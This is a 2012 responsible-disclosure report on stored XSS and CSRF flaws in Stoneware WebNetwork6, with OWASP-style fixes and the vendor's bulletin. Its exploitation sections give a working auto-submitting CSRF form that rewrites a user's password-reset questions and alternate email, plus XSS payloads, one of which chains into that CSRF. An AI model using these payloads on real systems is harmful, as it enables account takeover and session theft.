@@ -1,0 +1,196 @@
+Stoneware WebNetwork6 Vulnerability Assessment 
+
+* CVE-2012-0285 – XSS
+* CVE-2012-0286 - CSRF
+
+Conducted by:
+* Leland Public Schools (Stoneware Customer)
+* Jacob Holcomb (Network Engineer for LPS)
+
+Conducted for:
+* Leland Public Schools (Purchaser of WebNetwork product. Test was to assure cloud security)
+* Stoneware INC. (Discovered Zero Day vulnerabilities reported to support in 11/2011 & 12/2011)
+
+Date(s) Conducted:
+* 11/2011 – Started initial Web application penetration testing
+* 12/29/2011 – Started testing of Stoneware’s beta SP8 patch to resolve zero day vulnerabilities
+
+- Executive Summary
+
+The following reports details the findings from the security assessment performed by Jacob Holcomb of Leland Public Schools for the clients listed in the “Conducted for” heading.
+
+-Web Vulnerability Assessment-
+
+Deficiencies Noted
+
+The following findings were discovered, noted, and reported during the web application assessment.
+
+* WebNetwork6:
+o Six stored Cross Site Scripting (XSS) Zero Day vulnerabilities discovered in the WebNetwork6 product.
+
+o One Cross Site Request Forgery (CSRF) Zero Day vulnerabilities discovered in the WebNetwork6 product.
+
+
+Overall Summary
+
+The web application penetration test uncovered several deficiencies in the security structure of the WebNetwork6 private/hybrid cloud solution.
+
+- Findings and Recommendations
+
+The following Zero Day findings were discovered and disclosed through manual testing and were not disclosed by an automated web application security scanner (Such as Nessus, Acunetix, etc). 
+
+Recommendations to correct the issues are based off of web development best practices according to OWASP (Open Web Application Security Project) and do not reflect the changes implemented by Stoneware INC. to address the security concerns in the WebNetwork6 product outlined in this document. 
+
+Please see the section titled “Vendors solution to the problem” for a full comprehensive list of the actions taken to resolve the reported issues.
+
+-WebNetwork6 Vulnerability Findings-
+
+* XSS threats found. Input supplied by the user is not properly validated and sanitized by the Web Server application code prior to submitting the data for processing in multiple parts of the WebNetwork6 application.
+
+o This flaw in business programming logic allows malicious users to use the Cross Site Scripting attack vector to submit and store executable code on the server hosting WebNetwork that will be executed in a users browser.
+
+o XSS flaws occur when an application includes user-supplied input in a webpage that is sent to the browser without first properly validating or escaping (Sanitizing) that content.
+
+o Cross Site Scripting allows an attacker to execute scripts in a victim’s browser to hijack user sessions, deface web sites, insert hostile content, redirect users, etc.
+
+
+* CSRF threat found. Requests sent to the Web Server application do not contain any sort of unique identifier that is tied to the users session.
+
+o This flaw in business programming logic allows malicious users to use the Cross Site Request Forgery attack vector to submit a falsified HTTP request to the server and initiate a state change of user data/information on the server.
+
+o Cross Site Request Forgery (CSRF) takes advantage of a web applications logic and allows attackers to predict all the details of a particular action. Browsers send session ID’s (cookies) for the requested website automatically when requesting that site, so an attacker can create a malicious web page, HTML post, or e-mail which then generates a forged request indistinguishable from the legitimate request and gets submitted to the server for processing. 
+
+o Malicious hackers can cause victims (Administrator or lesser privileged users) to change any data the victim is allowed to change or perform any action the victim is authorized to use. The user must be logged in for this attack to work.
+
+o The CSRF can be exploited via the XSS attack vector as well using HTML GET request versus HTML POST request.
+
+-Common Vulnerabilities and Exposure (CVE)-
+
+The Common Vulnerabilities and Exposures (CVE) project has assigned the following CVE’s to the issues outlined in this web application penetration test report.
+
+* CVE-2012-0285 – XSS 
+* CVE-2012-0286 - CSRF
+
+-WebNetwork6 Vulnerability Solutions-
+
+* XSS
+o All untrusted data (user data) should be properly escaped (Sanitized) based on the HTML context that the data is going to be placed into.
+
+o Validate ALL input. If input is encoded, decode it, and then validate the length, type, characters, and format of the data being passed as input.
+
+* CSRF
+o To prevent CSRF the web server application should include an unpredictable synchronizer token that is unique for each HTTP request made or per user session.
+
+o The preferred option is to include the unique token in a hidden field. This will never reveal the value in the URL and is put into the body of the HTTP request being sent to the server for processing
+
+o The synchronizer token can also be placed in the URL itself as a URL parameter. Doing so is not recommended as it divulges this information to an attacker.
+
+CSRF Exploitation:
+
+In the following example we use CSRF to forge a HTTP POST request that will update or configure a users alternate e-mail, password reset questions, and password reset question answers. The user must be logged in for CSRF to work.
+
+Exploited URL: https://NameOfServer/apps/selfService/resetPasswordOptions.jsp
+
+
+HTML code for forged POST request:
+
+<!DOCTYPE HTML PUBLIC '-//W3C//DTD HTML 4.01 Transitional//EN'>
+
+<html lang="en">
+
+<head>
+
+<title>CSRF(POST):BY Jacob Holcomb</title>
+</head>
+
+<body>
+
+<form action="https://SERVERNAME/apps/selfService/resetPasswordOptions.jsp" id="formid" method="post">
+<input type="hidden" name="submitted" value="submit" />
+<input type="hidden" name="isSimpleResetEnabled" value="false" />
+<input type="hidden" name="m_question1" value="What is your mother's maiden name?" />
+<input type="hidden" name="m_answer1" value="null" />
+<input type="hidden" name="h_answer1" value="null" />
+<input type="hidden" name="m_question2" value="What is the city you were born in?" />
+<input type="hidden" name="m_answer2" value="null" />
+<input type="hidden" name="h_answer2" value="null" />
+<input type="hidden" name="altemail" value="enteremail@here.com" />
+</form>
+
+<script>
+document.getElementById('formid').submit();
+</script>
+
+</body>
+</html>
+
+XSS Exploitation:
+
+In the following example we use HTML tags to embed malicious code on the server hosting the WebNetwork6 application. This task is accomplished by inputting tagged HTML code in fields that accept user input. I will provide a few code snippets that were used in testing which you can find below along with the vulnerable JavaScript script that allows us to embed the arbitrary code through out the WebNetwork6 product.
+
+The affected locations of the webNetwork6 product susceptible to XSS are the “My Blog”, “TeamPages”, and “News and Articles” features. Each of these sections allows us to post content to the following JavaScript (Body of the post), which does not sanitize user input. The subject line (Post title) is also susceptible to persistent XSS. Two attacks possible per WebNetwork6 feature. 
+
+Exploited URL (Input Field): https://NameOfServer/swDashboard/pEdit/pinEditor.jsp?id=oPinEditor&crossdomain=false&autoFocus=false&new=true
+
+GET /swDashboard/pEdit/pinEditor.jsp?id=oPinEditor&crossdomain=false&autoFocus=false&new=true HTTP/1.1
+Host: host.domainname.com
+User-Agent: Mozilla/5.0 (X11; Linux i686 on x86_64; rv:9.0.1) Gecko/20100101 Firefox/9.0.1
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-us,en;q=0.5
+Accept-Encoding: gzip, deflate
+Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7
+DNT: 1
+Referer: https://hostname/community/blog.jsp?blogName=personal
+Cookie: SWARESESSIONID=COOKIE VALUE HERE; SWARESESSIONID=COOKIE VALUE HERE; CStoneSessionID=freire-COOKIE VALUE HERE
+Connection: keep-alive
+
+
+*The URL listed above in the HTML GET request is a JavaScript text editor that does not properly validate/sanitize user input.
+
+
+XSS Code snippets:
+
+* <script>alert(‘XSS Test’)</script>
+
+* <script>alert(document.cookie)</script>
+
+* <imgsrc="https://ServerNameHere/apps/selfService/resetPasswordOptions.jsp?submitted=submit&isSimpleResetEnabled=false&m_question1=What%20is%20your%20mother's%20maiden%20name%3F&m_answer1=For%20security%20purposes%2C%20your%20saved%20answers%20are%20not%20being%20displayed.&h_answer1=9xxxxxxxxxxxd0e3&m_question2=What%20is%20the%20city%20you%20were%20born%20in%3F&m_answer2=For%20security%20purposes%2C%20your%20saved%20answers%20are%20not%20being%20displayed.&h_answer2=9xxxxxxxxxxxd0e3&altemail=xxx%40xxx.com" />
+
+o The imgsrc HTML tag above allows us to submit a GET request to the server and perform our CSRF attack using a XSS attack vector to submit the falsified request.
+
+Compromise
+
+* The CSRF reported allows for a breach in directory service user accounts, which can lead to a compromise of the entire web application configuration, server hosting the web application, and potentially other servers, end nodes, and domain services on the domain network.
+
+* The six stored (persistent) XSS reported allows for information disclosure and arbitrary code execution that can lead to the compromise of a users account, machine, or other sensitive information.
+
+- Vendors Solution to the problem
+
+
+Stoneware has published a security bulletin on the issues outlined in this report. You can find the contents of the bulletin at http://www.stone-ware.com/swql.jsp?kb=d1960
+
+An e-mail advisory was also made available to Stoneware customers, which you can find below.
+
+Resolution
+
+* Cross-Site Request Forgery - CSRF issues were addressed by inclusion of a required, session-limited security token.
+
+* Cross-Site Scripting - XSS issues were addressed by escaping (Sanitizing) the untrusted input data.
+
+
+Stoneware Security Bulletin
+January 20, 2012
+Summary
+This security bulletin is provided to notify customers of two security vulnerabilities with the webNetwork product. Stoneware has released webNetwork 6.0 Service Pack 8 to address these issues. The vulnerabilities could allow for unintended information disclosure and breach of user accounts. The impact of exploitation of these vulnerabilities depend on the sensitivity of the content contained within webNetwork.
+
+Recommendation
+Stoneware recommends that customers upgrade to webNetwork 6.0 Service Pack 8 at their earliest opportunity.
+
+Acknowledgements
+Stoneware would like to thank Jacob Holcomb of Leland Public Schools for reporting CVE-2012-0285 and CVE-2012-0286.
+
+
+Disclaimer
+The information provided by Stoneware in this bulletin and in the Stoneware Knowledge Base is provided "as is" without warranty of any kind. Stoneware disclaims all warranties, either express or implied, including the warranties of merchantability and fitness for a particular purpose. In no event shall Stoneware, Inc. or its suppliers be liable for any damages whatsoever including direct, indirect, incidental, consequential, loss of business profits or special damages, even if Stoneware, Inc. or its suppliers have been advised of the possibility of such damages. Some states do not allow the exclusion or limitation of liability for consequential or incidental damages so the foregoing limitation may not apply.
+Revisions
+1.0, 2012-January-20, Bulletin published.
